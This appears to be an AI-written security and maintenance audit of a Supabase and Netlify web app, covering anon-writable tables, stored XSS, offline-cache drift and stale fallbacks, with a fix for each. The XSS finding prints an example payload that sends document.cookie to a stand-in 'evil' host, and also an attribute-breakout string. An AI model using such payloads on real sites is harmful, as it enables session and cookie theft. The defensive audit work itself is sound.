# Singularity City — Full Codebase Audit (2026-07-09)

Read-only audit. No source files were changed (this report is the only new file).
Scope: architecture, correctness, security, data-pipeline robustness, performance,
domain-data consistency, maintainability, build/release, accessibility/resilience.

**Method:** grounded in `memory/*` + `MAINTENANCE.md`, then traced the data flow
(live feeds → Netlify functions → Supabase → client fallback) and the render loop
before judging. Where cheap, findings were proven (grep for callers, read the actual
values, diffed the precache list, read the RLS SQL). Each finding is tagged
**CONFIRMED** (I verified it in code) or **PLAUSIBLE** (consistent with the code but I
could not fully prove it from the repo — usually because it depends on Supabase console
state that isn't version-controlled).

A deliberate list of **positive confirmations** (known traps that are correctly handled)
and **what I did NOT get to** is at the end, so nothing looks falsely cleared.

## CRITICAL

### 1. The shared global `models` table is writable (and destroyable-by-content) by any anonymous visitor
**Files:** `js/engine.js:38-39`, `netlify/functions/sc_models_rls.sql:37-48`, `js/api.js:422,602,784,2575`
**Confidence:** CONFIRMED

The publishable Supabase key is hardcoded and public (as intended for a publishable key):

```
js/engine.js:39   supabaseKey: "sb_publishable_ucIgRt4nL0kY_ZHbcz92nQ_8O0PzeNA",
```

`sc_models_rls.sql` intentionally keeps **anon INSERT and UPDATE** on `models` with
**no validation** (`with check (true)`), revoking only DELETE:

```
sc_models_rls.sql:37-48   create policy "models anon insert" ... with check (true);
                          create policy "models anon update" ... using (true) with check (true);
```

**Failure scenario:** anyone who opens devtools (the key is right there in `engine.js`)
can `POST`/`PATCH` arbitrary rows to `…/rest/v1/models` — rename every model, inject
1,000 fake citizens, set absurd benchmarks/pricing, or overwrite real flagships with
garbage. Because `fetchCloudModels()` (js/api.js:246) loads this table on every visitor's
boot, the poisoning is **global and persistent**. The client-side `_verifyModel` gate and
the 6-hourly `db-maintenance.mjs` purge (capped at 80 deletes/run) only catch *hallucination
heuristics* — a plausible-looking name that passes verification is never purged, and a mass
insert outruns the purge cap. For a project whose entire thesis is "authoritative, accurate,
cutting-edge" ([[accuracy-mandate]]), a stranger being able to edit the canonical dataset is
the highest-impact issue here.

**Why it's Critical, not just an accepted design:** the memory frames anon writes as
"self-maintaining by design," and that's fine for *additive discovery*. But `check (true)`
UPDATE means anon can also **mutate existing rows** (not just add), which is vandalism, not
discovery. Nothing in the app needs anon UPDATE of arbitrary columns on arbitrary rows.

**Suggested fix (in priority order):**
- Move *all* writes server-side (the pattern already exists for `ai_bans`/`sc_events`): a
  small authenticated Netlify function that accepts a candidate model, runs `_verifyModel`,
  and upserts with the service key. Then set `models` to **anon read-only** like `ai_bans`.
- If client writes must stay: at minimum drop the anon UPDATE policy (keep INSERT), add a
  `with check` that constrains column shapes/lengths, and add row-rate limiting via a
  Postgres policy or an Edge Function proxy.
- Rotate the publishable key after locking down (it has been public in git history).

## HIGH

### 2. Stored XSS: lab and founder fields reach `innerHTML` unescaped
**Files:** `js/ui.js:646, 1332-1337, 1402-1403, 1418`; CSP in `netlify.toml:59`
**Confidence:** CONFIRMED (the rendering gap) / PLAUSIBLE (that the write path is open)

The codebase is *mostly* disciplined — `escapeHTML()` (js/ui.js:5) is applied to model
names, descriptions, personalities, zone-panel fields, etc. But **lab-level and
founder-level fields are interpolated raw**:

```
js/ui.js:646    ...<div class="ipanel-sub" style="color:${lab.color}">${lab.name}</div>...   // lab.name RAW
js/ui.js:1332   <div class="ipanel-name">${f.name}</div><div ...>${f.role}</div>            // founder RAW
js/ui.js:1335   <div class="ipanel-desc">${f.fact}</div>                                      // founder RAW
js/ui.js:1403   <span>${li.icon}</span> ${li.name} (${gr[lk].length})                         // lab.icon/name RAW
```

`lab.*` comes from the Supabase `labs` table (js/api.js:85-94); `f.*` from `founders`
(js/api.js:96-102, and the scan writes `founder_name` straight from LLM output at
js/api.js:2477). A row like `founders.name = "<img src=x onerror=fetch('//evil/?c='+document.cookie)>"`
executes for **every visitor who opens that founder's panel** (Billionaire's Row is
clickable). Color fields are interpolated **inside `style="…"`** (e.g. `style="color:${lab.color}"`),
so an attacker-controlled `labs.color` such as `red" onmouseover="alert(1)` breaks out of the
attribute even without an unescaped text node.

Crucially, **the CSP does not mitigate this**: `netlify.toml:59` allows
`script-src 'self' 'unsafe-inline' 'unsafe-eval'`, so an injected inline handler runs.

Why PLAUSIBLE on the write path: `founders`/`labs` have **no committed RLS file** (see #4),
but the client upserts to `founders` (js/api.js:2490) and the app depends on those writes
succeeding — strongly implying anon INSERT is allowed, which would make this end-to-end
exploitable exactly like #1.

**Suggested fix:** wrap every externally-sourced field in `escapeHTML()` (`lab.name`,
`lab.icon`, `f.name`, `f.role`, `f.fact`, and building `b.name`/`b.desc` in the panel
header for good measure). Validate color fields against `/^#[0-9a-f]{6}$/i` before
interpolating into `style` (the DC scanner already does this at js/api.js:1396 — reuse that
guard). Longer term, tighten the CSP off `unsafe-inline` (hard given the many inline
`onclick=` handlers, but worth planning).

### 3. Service-worker precache is missing two shipped modules → offline PWA breaks
**Files:** `sw.js:8-116` vs `index.html:876-877`
**Confidence:** CONFIRMED (diffed)

`index.html` loads `js/robot_models.js?v=510` and `js/space_rockets.js?v=510`, but neither
is in `sw.js`'s `CORE_ASSETS` precache list. Verified by diffing the directory against both
lists:

```
JS files on disk NOT precached in sw.js:  /js/robot_models.js , /js/space_rockets.js
JS in index.html but NOT in sw.js precache: js/robot_models.js , js/space_rockets.js
```

**Failure scenario:** an installed PWA goes offline. `sw.js`'s fetch handler returns a 503
for any non-navigation request not in cache. `robot_models.js` / `space_rockets.js` fail to
load, so `RobotModels` / `SpaceRockets` are undefined — the Robotics Testing Ground and
every Space Zone pad/launch/interior throw `ReferenceError` on first draw. The install
banner advertises "offline support" (index.html:531), so this is a real regression, not
theoretical. (Online, they fall through to network and it's invisible — which is why it
went unnoticed.)

**Root cause:** `tools/cachebust.mjs` bumps `?v=` and the `CACHE_NAME`, but does **not**
manage the `CORE_ASSETS` list — it's hand-maintained and drifted when `robot_models.js`
(v487) and `space_rockets.js` (v486) were added.

**Suggested fix:** add both to `CORE_ASSETS`. Better: have `cachebust.mjs` regenerate
`CORE_ASSETS` from the `js/*.js` script tags in `index.html` so the two can never diverge
again (this also protects future additions).

### 4. RLS posture is unauditable — only 2 tables have committed policies; the client writes 7+ others
**Files:** `netlify/functions/*.sql` (only `sc_models_rls`, `sc_ai_bans`, `sc_events`, `sc_metrics_history`, `vc_funding` exist); client writes at `js/api.js:1090,1168,1235,2490,2611,2899`, `js/datacenter_data.js:224`
**Confidence:** CONFIRMED (the files are absent) / PLAUSIBLE (the tables are anon-writable)

The client upserts/inserts to `models`, `founders`, `families`, `ai_events`, `vc_deals`,
`supply_chain`, `blds`, and `dc_facilities` with the anon key. Only `models` and `ai_bans`
have committed RLS. For the others there is **no policy in the repo**, so their security is
whatever was clicked into the Supabase console once — not reviewable, not reproducible, and
(because the client depends on the writes) very likely permissive anon INSERT/UPDATE. That
makes every one of them a data-integrity and (for `founders`/`labs`/`blds`, which render
into panels) XSS surface, same shape as #1/#2.

**Failure scenario:** same as #1 but for `blds` — inject a building row with a malicious
`name`/`desc`, or shift `x` coordinates to scramble the map for all visitors. Or spam
`ai_events`/`vc_deals` with junk that shows in the calendar/ticker globally.

**Suggested fix:** commit a single `rls_all.sql` that sets the intended policy for *every*
table (mirror `sc_models_rls.sql`'s pattern), run it once, and keep it in version control so
the posture is reviewable. Decide per-table whether anon writes are truly needed; prefer the
server-writer pattern (#1) for anything that renders to other users.

## MEDIUM

### 5. LLM calendar fallback is frozen to a past date range
**File:** `js/api.js:1257`
**Confidence:** CONFIRMED

```
js/api.js:1257  const prompt = `List 15 major upcoming AI/ML conferences ... for the
                remainder of 2025 and early 2026. ...`;
```

Today is 2026-07-09. When the RSS event feeds return nothing and the user has an API key,
this fallback asks the model for events that are **entirely in the past**. Directly violates
the accuracy mandate and produces stale calendar entries that then persist to `ai_events`.

**Suggested fix:** derive the window from `new Date()` (e.g. "for the next 6 months from
`${today}`"), exactly like the DC-scan prompt already does at js/api.js:1318-1322.

### 6. No local seed data — a Supabase outage yields a near-empty city, and "offline support" is over-promised
**Files:** `js/data.js:5-13` (`SEED=[]`, `BLDS=[]`, `LABS={}`), boot at `js/engine.js:2333`
**Confidence:** CONFIRMED

The curated baseline — labs, buildings (`bld_*`, incl. the Legacy Museum `bld_1`), founders,
compute clusters — is loaded **only** from Supabase (`fetchCoreData`). `SEED`/`BLDS`/`LABS`
start empty and there is no bundled fallback. If Supabase is unreachable, `fetchCoreData()`
returns `false` and the city boots with only the procedurally-added stubs (metro stations,
`neon_bar`, `graveyard`, `times_hq`, forests) plus whatever the live model APIs
(HF/ZeroEval/OpenRouter) drip in over the first ~11s. The Tech District HQs, museum, and
founder estates simply never appear.

Combined with #3: an installed PWA offline has cached JS but **no cached data** (all content
is network-sourced from Supabase + third-party APIs), so the advertised "offline support"
(index.html:531) is misleading — offline shows an empty shell.

**Suggested fix:** either (a) bundle a small static `data/seed-core.json` (labs + core blds
+ a handful of anchor models) and load it when `fetchCoreData` fails / offline, or (b)
soften the offline-support marketing copy. (a) also aligns with the "a broken source is
worse than a stale string" principle — the stale string here is a legitimate cold-start
floor that self-heals from the live feeds.

### 7. Stale and inconsistent hardcoded default model IDs
**Files:** `js/api.js:2251` (scan), `js/api.js:1263,1546` (analyst), `js/api.js:1263` (events)
**Confidence:** CONFIRMED

Default `G.modelId` fallbacks differ across call sites and are old:
- Scan (anthropic): `claude-3-5-sonnet-20240620` (June 2024)
- Analyst / events (anthropic): `claude-sonnet-4-20250514` (May 2025)
- OpenAI: `gpt-4o`; Google: `gemini-2.5-flash`; xAI: `grok-3-latest`

These only apply when the user hasn't picked a model, so severity is limited — but a
2024-era default on a July-2026 "cutting-edge" app is off-brand, and the inconsistency
(scan uses a *different, older* Claude than the analyst) is a latent surprise. `claude-3-5-
sonnet-20240620` in particular is a candidate for provider deprecation.

**Suggested fix:** single source of truth for provider defaults (one small map), and pick
current model ids. Per [[model-version-ceilings]], avoid re-introducing a *ceiling* — this
is just a sane default, ideally the provider's "latest" alias where one exists.

## LOW

### 8. `fetchStocks` has no timeout and serializes with a 1.1s delay per symbol
**File:** `js/api.js:894-923` (fetch at 901, `setTimeout(res, 1100)` at 921)
**Confidence:** CONFIRMED

Every other feed uses `AbortSignal.timeout(...)`; this one doesn't. A hung Finnhub
connection blocks the loop indefinitely for that symbol. With ~30 lab tickers + fabs and a
1.1s inter-request sleep, a full refresh takes ~35s. Not fatal (it's async), but a stuck
socket + no timeout means a ticker can wedge silently. **Fix:** add
`{ signal: AbortSignal.timeout(8000) }`.

### 9. Stale hardcoded fallbacks that rot silently
**Files:** `js/api.js:876-881` (news fallback), `js/data.js:196` (`NEWS`), `js/api.js:2158-2170` (`flagshipExpectations`)
**Confidence:** CONFIRMED

- The `fetchLiveNews` last-resort fallback headlines ("GPT-4.1", "Claude Opus 4.6",
  "Gemini 2.5 Pro", "DeepSeek R1") and the `NEWS` array ("Nvidia announces B200",
  "EU AI Act enters into force") are ~2024-2025 vintage. Only shown when rss2json fails, but
  when shown they misrepresent the frontier.
- `flagshipExpectations` (js/api.js:2158) is a frozen list used to nudge the scan toward
  "missing" flagships. It is **not** a rejection ceiling (the `forwardNudge` and "our list is
  deliberately stale" instruction compensate — see positive-confirmations), but it is a
  hand-maintained list that will rot, in tension with [[self-maintaining]].

**Fix:** derive the news fallback from the last successful `cloudEvents`/`vcDeals` where
possible; regenerate `flagshipExpectations` from the auto-raised `_maxKnownVersions` +
`_familyToLab` instead of a static object.

**File:** `index.html:806-807`
**Confidence:** CONFIRMED

## Positive confirmations (verified NOT to be issues — so they aren't re-flagged later)

These are the traps the memory/MAINTENANCE flagged; I traced each and they are correctly
handled today:

- **Model-version ceilings are NOT frozen.** `_autoDetectVersionCaps()` (js/api.js:2090) is
  wired (called from `_buildVerifiedRegistry` at 2087) and raises `_maxKnownVersions` from
  trusted-source names; frontier families get `+1.0` tolerance (js/api.js:1620); the scan
  prompt's `forwardNudge` (js/api.js:2187) is derived from the live caps and explicitly says
  "our internal list is deliberately stale; do not anchor to it." The trap in
  [[model-version-ceilings]] is genuinely defused.
- **Jail ban-release is sound.** `_ruleAppliesToViewer` honors `until` expiry
  (js/jail.js:143); `fetchRemoteBans` filters `active !== false` so cooldown tombstones never
  jail (js/jail.js:262); `refreshBanned` evicts released bodies immediately (js/jail.js:317-333).
  Seed rules are ongoing geo-bans (no `until` needed); no global seed without expiry exists.
- **DC construction→operational auto-flip fires.** `DCManager.checkCompletions()`
  (js/datacenter_data.js:149) flips on `currentYear >= completionYear`, guarded by
  `_completedIds`, and is called from `evolveCity` (js/engine.js:692) and init (1468).
- **Analyst LLM-output XSS is handled.** `_mdToHtml` (js/api.js:1497) escapes `&<>` *before*
  markdown expansion, and the user question is escaped (js/api.js:1520).
- **Scheduled functions fail loudly, not silently.** `collect-events.mjs` catches per-source
  errors, logs Supabase write failures, and returns HTTP 500 on failure (so the Netlify
  dashboard shows a red invocation). Timeouts + `User-Agent` present on the strict hosts
  (Overpass in `update-grid-background`, and db-maint/ban-bot/vc-funding). Schedules match
  MAINTENANCE Part A exactly.
- **`geo.mjs` is privacy-safe** — returns only country/region code, stores no IP.
- **Render performance is well-managed.** No per-frame `PIXI.Text`/`Graphics` allocation in
  hot paths (`entities.js` has zero `new PIXI.Text`; the 26 in `environment.js` are all
  build-time, stored on `b._dcSign`); off-screen culling (`_cullOffScreen`), a cached
  subsystem table, and `tick % 2/30/60` throttling are all in place; the hidden-tab 2-tps
  `setInterval` fallback is correct.
- **Tracking ↔ train-focus handoff** matches the documented v473 design (js/engine.js:1190-1211).

## (a) The 5 highest-leverage fixes first

1. **Lock down Supabase writes (#1, #4).** Make `models` (and `founders`/`labs`/`blds`/
   `families`/`ai_events`/`vc_deals`/`supply_chain`/`dc_facilities`) anon **read-only**, and
   route the handful of client writes through a verify-then-write Netlify function with the
   service key (the `ai_bans`/`sc_events` pattern already proves this works). Commit the RLS
   as SQL. This closes the biggest data-integrity hole and removes the XSS *delivery* path.
2. **Escape lab + founder + building fields in `ui.js` (#2)** and hex-validate color fields
   before they enter `style="…"`. Small, self-contained, high value — do it even before #1
   lands, because it's the actual code execution.
3. **Fix the `sw.js` precache drift (#3)** and, ideally, auto-generate `CORE_ASSETS` from
   `index.html` in `cachebust.mjs` so it can't recur.
4. **De-stale the LLM calendar prompt (#5)** — one-line change, direct accuracy win.
5. **Add a bundled core seed + honest offline behavior (#6).** Either ship `seed-core.json`
   or fix the "offline support" copy; also add the missing `fetchStocks` timeout (#8) while
   in `api.js`.

## (b) Systemic patterns worth a follow-up pass

- **Trust boundary on the shared DB.** The recurring theme (#1, #2, #4) is that a *public
  writable* global database is treated as trusted input. Every table that renders to other
  users should be either server-written or strictly validated + escaped. A single "all
  external strings get `escapeHTML` at the render boundary" convention (and a lint rule that
  flags `innerHTML =` with an un-`escapeHTML`'d `${…}`) would prevent the whole class.
- **Hand-maintained lists that rot.** `flagshipExpectations`, the news/`NEWS` fallbacks,
  default model IDs, and the `sw.js` precache list are all manually synced and have each
  drifted. Prefer generating them from a live/derived source (the version-cap machinery is
  the good example to copy).
- **RLS/schema as code.** Only some tables have committed SQL. Bringing *all* Supabase
  policies into the repo makes the security posture reviewable and reproducible.
- **CSP is permissive** (`unsafe-inline`/`unsafe-eval`), so it provides no XSS backstop.
  Long-term, migrating inline `onclick=` handlers to delegated listeners would let you drop
  `unsafe-inline`.

- **`multiplayer.js` (Supabase Realtime presence).** Another anon-key surface — not reviewed.
